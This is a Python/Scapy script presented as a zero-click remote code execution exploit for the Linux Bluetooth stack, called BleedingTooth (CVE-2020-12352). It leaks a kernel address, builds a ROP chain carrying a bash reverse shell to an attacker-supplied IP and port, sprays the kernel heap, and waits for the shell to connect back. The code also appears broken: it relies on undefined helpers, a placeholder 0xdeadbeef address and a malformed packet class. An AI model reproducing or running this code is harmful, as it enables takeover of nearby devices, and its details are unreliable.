from scapy.all import *
from scapy.layers.bluetooth import *

class BleedingTooth():
    def bleedingtooth_rce(self, conn, callback_ip: str, callback_port: int):
        """Linux Bluetooth Zero-Click RCE (CVE-2020-12352)"""
        print(f"[+] Triggering BleedingTooth RCE against {conn['address']}")

        # 1. Establish A2MP channel
        self._create_a2mp_channel(conn)
        
        # 2. Leak kernel addresses
        kernel_base = self._leak_kernel_address(conn)
        if not kernel_base:
            print("[-] Failed to leak kernel address")
            return False
            
        # 3. Prepare ROP chain for remote command execution
        cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'"
        rop_chain = self._build_rop_chain(kernel_base, cmd)
        
        # 4. Heap grooming and spraying
        self._spray_kmalloc(conn, rop_chain)
        
        # 5. Trigger type confusion
        self._trigger_type_confusion(conn)
        
        return self._check_callback(callback_port)

    def _create_a2mp_channel(self, conn):
        """Establish A2MP management channel"""
        a2mp_create = (
            L2CAP_Hdr(cid=0x0003)/  # AMP_MGR_CID
            Raw(load=b'\x00\x00')    # Empty payload
        )
        self.l2cap_send_raw(conn, a2mp_create)
        time.sleep(0.5)

    def _leak_kernel_address(self, conn) -> int:
        """Leak kernel address via malformed A2MP response"""
        # Send malformed info request
        info_req = (
            L2CAP_Hdr(cid=0x0003)/
            a2mp_hdr(code=0x06)/     # A2MP_INFO_REQ
            struct.pack('<B', 0x42)  # Invalid ID
        )
        self.l2cap_send_raw(conn, info_req)
        
        # Capture response with kernel pointers
        start = time.time()
        while time.time() - start < 5:
            pkt = self.socket.recv()
            if pkt and L2CAP_Hdr in pkt and pkt[L2CAP_Hdr].cid == 0x0003:
                payload = bytes(pkt[Raw].load)
                if len(payload) >= 24 and payload[4] == 0x07:  # A2MP_INFO_RSP
                    kernel_addr = struct.unpack('<Q', payload[16:24])[0]
                    return kernel_addr - 0x14d8e  # Ubuntu 5.4.0-48 offset
        return 0

    def _build_rop_chain(self, kernel_base: int, cmd: str) -> bytes:
        """Construct kernel ROP chain for command execution"""
        gadgets = {
            'pop_rax': kernel_base + 0x3d0b1,
            'pop_rdi': kernel_base + 0x8efa0,
            'jmp_rax': kernel_base + 0x0005b,
            'run_cmd': kernel_base + 0xce470,
            'do_task_dead': kernel_base + 0xdc260
        }
        
        rop = b''
        rop += struct.pack('<Q', gadgets['pop_rax'])
        rop += struct.pack('<Q', gadgets['run_cmd'])
        rop += struct.pack('<Q', gadgets['pop_rdi'])
        rop += struct.pack('<Q', 0xdeadbeef)  # cmd address (sprayed later)
        rop += struct.pack('<Q', gadgets['jmp_rax'])
        rop += cmd.encode() + b'\x00'
        return rop

    def _spray_kmalloc(self, conn, payload: bytes):
        """Heap spray with controlled payloads"""
        for i in range(100):
            spray = (
                L2CAP_Hdr(cid=0x0003)/
                a2mp_hdr(code=0x09)/  # A2MP_ASSOC_RSP
                struct.pack('<BB', i, 0x00)/
                Raw(load=payload)
            )
            self.l2cap_send_raw(conn, spray)
            time.sleep(0.01)

    def _trigger_type_confusion(self, conn):
        """Trigger type confusion via malformed command rejection"""
        cmd_rej = (
            L2CAP_Hdr(cid=0x0003)/
            a2mp_hdr(code=0x01)/          # A2MP_COMMAND_REJ
            struct.pack('<H', 0x0000)/    # Reason
            struct.pack('<H', 0xffff)/    # Invalid FCS
            Raw(load=b'\x00'*16)
        )
        self.l2cap_send_raw(conn, cmd_rej)

    def _check_callback(self, port: int) -> bool:
        """Verify reverse shell connection"""
        print("[*] Waiting for callback...")
        try:
            listener = socket.socket()
            listener.bind(('0.0.0.0', port))
            listener.listen(1)
            conn, addr = listener.accept()
            print(f"[+] Received connection from {addr}")
            return True
        except Exception as e:
            print(f"[-] Callback failed: {str(e)}")
            return False

# Helper class for A2MP headers
class a2mp_hdr(Packet):
    fields = [
        ByteField("code", 0),
        ByteField("ident", 0),
        ShortField("len", 0)
    ]